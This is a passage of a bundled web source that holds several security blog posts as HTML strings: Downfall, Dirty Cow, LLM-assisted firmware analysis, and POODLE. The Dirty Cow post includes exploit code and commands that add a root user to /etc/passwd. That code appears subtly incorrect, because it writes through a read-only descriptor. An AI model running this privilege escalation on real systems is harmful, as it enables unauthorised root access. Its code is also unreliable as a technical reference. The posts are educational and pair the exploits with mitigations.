          Modern CPUs optimize performance by predicting and executing instructions ahead of time through speculative execution. However, speculative execution does not adhere to standard security checks during execution, which creates opportunities for attackers to access restricted data.
        </p>

        <h2>Downfall’s Mechanism</h2>
        <p>
          Downfall specifically exploits speculative execution in Advanced Vector Extensions (AVX). It leverages a use-after-free vulnerability during the speculative execution of AVX instructions to access sensitive data stored in vector registers.
        </p>

        <h2>Conceptual Exploit Example</h2>
        <p>
          Below is a conceptual C pseudocode to demonstrate how speculative execution attacks like Downfall work. This example is strictly for educational purposes only to understand the mechanics of such vulnerabilities.
        </p>
        <div class="code-block">
          <code>
#include &lt;stdio.h&gt;<br>
#include &lt;immintrin.h&gt;  // For AVX instructions<br>
#include &lt;stdint.h&gt;<br><br>

// Step 1: Setup memory and registers<br>
void setup_sensitive_data() {<br>
    volatile char secret[] = "SensitiveData"; // Simulated sensitive data<br>
    __m256i vector_data = _mm256_loadu_si256((__m256i *)secret); // Load data into vector register<br>
}<br><br>

// Step 2: Induce speculative execution<br>
void trigger_speculative_execution(char *probe_array) {<br>
    volatile uint64_t timing;<br>
    int speculative_index = 1024; // An index beyond bounds for speculative execution<br>
    char leaked_value;<br><br>

    // Access array in a way to induce speculative execution<br>
    if (speculative_index &lt; 512) {  // This branch is speculatively executed<br>
        leaked_value = probe_array[speculative_index];<br>
    }<br><br>

    // Measure timing to infer accessed value (side-channel analysis)<br>
    for (int i = 0; i &lt; 256; i++) {<br>
        timing = measure_timing(&amp;probe_array[i * 64]); // Simulated timing measurement<br>
        if (timing &lt; THRESHOLD) {<br>
            printf("Leaked value: %c\\n", i); // Print inferred value<br>
        }<br>
    }<br>
}<br><br>

// Step 3: Measure cache timing (side-channel)<br>
uint64_t measure_timing(void *addr) {<br>
    uint64_t start, end;<br>
    asm volatile (<br>
        "mfence\\n"<br>
        "lfence\\n"<br>
        "rdtsc\\n"      // Read time-stamp counter<br>
        "mov %%rax, %0\\n"<br>
        "mov (%1), %%r8\\n" // Access memory<br>
        "rdtscp\\n"<br>
        "mov %%rax, %1\\n"<br>
        "mfence\\n"<br>
        : "=r"(start), "=r"(end)<br>
        : "r"(addr)<br>
        : "rax", "rbx", "rcx", "r8"<br>
    );<br>
    return end - start;<br>
}<br><br>

// Main Function<br>
int main() {<br>
    char probe_array[256 * 64]; // Array for side-channel timing analysis<br><br>

    setup_sensitive_data();<br>
    trigger_speculative_execution(probe_array);<br><br>

    return 0;<br>
}
          </code>
        </div>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Intel Microcode Updates:</strong> Intel has released microcode updates to mitigate speculative execution vulnerabilities like Downfall. Update your system’s firmware to the latest version provided by your hardware vendor.</li>
          <li><strong>Implement Operating System Mitigations:</strong> Operating system vendors have introduced software-level protections, such as disabling AVX extensions on affected processors when microcode updates are unavailable.</li>
          <li><strong>Restrict Local Access:</strong> Ensure only trusted users have access to systems. Many speculative execution vulnerabilities require local access to exploit.</li>
          <li><strong>Monitor Performance Impact:</strong> Mitigations may degrade performance, especially for workloads heavily reliant on AVX instructions. Assess the trade-offs based on your environment.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Downfall (CVE-2022–40982) demonstrates the dangers of speculative execution vulnerabilities and the importance of constant vigilance in securing modern computing environments. Organizations must prioritize patching, enforce security policies, and consider performance impacts to balance security and efficiency.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,ov=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Dirty Cow (CVE-2016–5195): Privilege Escalation in Linux</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Dirty Cow?</h2>
        <p>
          In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.
        </p>

        <h2>What is Copy-On-Write (COW)?</h2>
        <p>
          Copy-On-Write (COW) is a memory optimization technique in Linux where multiple processes share the same memory pages for read operations. If one process tries to modify a shared page, the kernel creates a private copy for that process, ensuring changes don’t affect the original shared memory.
        </p>

        <h2>The Problem</h2>
        <p>
          Dirty Cow arises from a race condition in the kernel’s <code>mmap</code> system call during the handling of COW. By exploiting this condition, an attacker can gain write access to read-only memory, effectively modifying protected files like <code>/etc/passwd</code> or <code>/etc/shadow</code> to escalate privileges.
        </p>

        <h2>Exploitation Workflow</h2>
        <p>The Dirty Cow vulnerability enables an attacker to:</p>
        <ol>
          <li>Create a memory mapping of a file they want to overwrite.</li>
          <li>Exploit the race condition to bypass COW and write directly to the file.</li>
          <li>Modify files like <code>/etc/passwd</code> to add a root user or escalate privileges.</li>
        </ol>

        <h2>Demonstrating Dirty Cow (CVE-2016–5195)</h2>
        <p><strong>Disclaimer:</strong> This demonstration is for educational purposes only. Do not execute this on systems you do not own or have explicit permission to test.</p>

        <h3>Exploit Code</h3>
        <p>Save the following as <code>dirtycow.c</code>:</p>
        <div class="code-block">
          <code>
#include &lt;fcntl.h&gt;<br>
#include &lt;pthread.h&gt;<br>
#include &lt;string.h&gt;<br>
#include &lt;sys/mman.h&gt;<br>
#include &lt;stdio.h&gt;<br>
#include &lt;unistd.h&gt;<br><br>
char *target_file = "/etc/passwd";<br>
char *new_content = "hacked:x:0:0:hacked:/root:/bin/bash\\n";<br>
int f;<br><br>
void *madvise_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        madvise(arg, 100, MADV_DONTNEED);<br>
    }<br>
    return NULL;<br>
}<br><br>
void *write_thread(void *arg) {<br>
    for (int i = 0; i &lt; 1000000; i++) {<br>
        lseek(f, 0, SEEK_SET);<br>
        write(f, new_content, strlen(new_content));<br>
    }<br>
    return NULL;<br>
}<br><br>
int main() {<br>
    f = open(target_file, O_RDONLY);<br>
    if (f &lt; 0) {<br>
        perror("Failed to open target file");<br>
        return 1;<br>
    }<br><br>
    char *map = mmap(NULL, 100, PROT_READ, MAP_PRIVATE, f, 0);<br>
    if (map == MAP_FAILED) {<br>
        perror("mmap failed");<br>
        return 1;<br>
    }<br><br>
    pthread_t t1, t2;<br>
    pthread_create(&amp;t1, NULL, madvise_thread, map);<br>
    pthread_create(&amp;t2, NULL, write_thread, NULL);<br><br>
    pthread_join(t1, NULL);<br>
    pthread_join(t2, NULL);<br><br>
    printf("Exploit complete. Check /etc/passwd for changes.\\n");<br>
    return 0;<br>
}
          </code>
        </div>

        <h3>Compiling and Running the Exploit</h3>
        <div class="code-block">
          <code>
# Compile the exploit<br>
gcc -pthread dirtycow.c -o dirtycow<br><br>
# Run the exploit<br>
./dirtycow<br><br>
# Check for changes<br>
cat /etc/passwd
          </code>
        </div>

        <p>Look for the new root user: <code>hacked:x:0:0:hacked:/root:/bin/bash</code>. You can now switch to this user:</p>
        <div class="code-block">
          <code>su hacked</code>
        </div>

        <h2>Mitigation</h2>
        <ol>
          <li><strong>Patch the Kernel:</strong> Update the Linux kernel to a version where the Dirty Cow vulnerability is fixed.</li>
          <li><strong>Use Access Controls:</strong> Restrict write access to sensitive files like <code>/etc/passwd</code> and <code>/etc/shadow</code> to privileged users only.</li>
          <li><strong>Enable SELinux or AppArmor:</strong> Mandatory Access Control frameworks can prevent unauthorized file modifications.</li>
          <li><strong>Limit Privileges:</strong> Run services and applications with the least privileges necessary to function.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          Dirty Cow serves as a stark reminder of the potential impact of race conditions and privilege escalation vulnerabilities. While the Linux kernel is robust, vulnerabilities like this highlight the need for regular updates, proper system configuration, and defense-in-depth security practices.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,cv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Firmware Exploration: LLM as Your Annotator</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      line-height: 1.6;
      max-width: 900px;
      margin: 2rem auto;
      padding: 0 1rem;
      color: #111827;
      background: #f9fafb;
    }
    h1, h2, h3 {
      color: #111827;
    }
    h1 {
      font-size: 2.2rem;
      margin-bottom: 0.5rem;
    }
    h2 {
      margin-top: 2rem;
      border-bottom: 1px solid #e5e7eb;
      padding-bottom: 0.25rem;
    }
    h3 {
      margin-top: 1.5rem;
    }
    code {
      font-family: "Fira Code", Menlo, Monaco, Consolas, "Courier New", monospace;
      font-size: 0.9rem;
    }
    pre {
      background: #111827;
      color: #e5e7eb;
      padding: 1rem;
      border-radius: 0.5rem;
      overflow-x: auto;
      font-size: 0.9rem;
    }
    blockquote {
      border-left: 4px solid #3b82f6;
      padding-left: 1rem;
      color: #374151;
      margin: 1rem 0;
      background: #eff6ff;
    }
    ul, ol {
      padding-left: 1.4rem;
    }
    hr {
      border: 0;
      border-top: 1px solid #e5e7eb;
      margin: 2rem 0;
    }
    .emoji {
      font-style: normal;
    }
  </style>
</head>
<body>

  <h1>Firmware Exploration: LLM as Your Annotator</h1>

  <p>
    If you’ve ever opened a firmware image and stared at a hex dump thinking “nope,” you’re not alone.
  </p>

  <p>
    Modern IoT and embedded devices ship with complex firmware: full Linux distributions, RTOS kernels, proprietary bootloaders, custom update mechanisms, and often… questionable security decisions. Large-scale studies have shown that firmware is a gold mine for vulnerabilities, from hard-coded credentials to unsafe update logic and exposed debug interfaces.
  </p>

  <p>
    At the same time, governments and standards bodies are pushing manufacturers to treat firmware security seriously. NIST’s IoT Cybersecurity guidance and documents like SP 800-213/213A explicitly call out firmware, update mechanisms, and device integrity as critical capabilities for secure IoT products.
  </p>

  <p>
    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,uv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
